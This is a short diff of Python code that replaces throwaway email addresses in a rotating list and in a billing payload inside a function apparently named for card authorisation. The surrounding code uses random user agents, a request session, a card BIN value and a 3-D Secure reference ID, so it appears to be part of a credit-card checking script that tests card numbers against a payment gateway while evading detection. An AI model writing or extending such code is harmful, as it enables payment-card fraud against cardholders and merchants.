-	acc = ['cotep55150@ndiety.com','kehepew586@ndiety.com','coxey31650@ndiety.com']
+	acc = ['wopijeg693@kwalah.com','lilega5280@hapied.com']
 	email = random.choice(acc)
 	user = user_agent.generate_user_agent()
 	r = requests.session()
@@ -4381,7 +4500,7 @@ def au(ccx):
         'billingPhoneNumber': '66464649',
         'billingGivenName': 'Mero',
         'billingSurname': 'AYman',
-        'email': 'mehis41455@givehit.com',
+        'email': 'wopijeg693@kwalah.com',
     },
     'bin': '510875',
     'dfReferenceId': '0_3badc98d-9c3b-4202-b7b9-8b1dea848bf7',
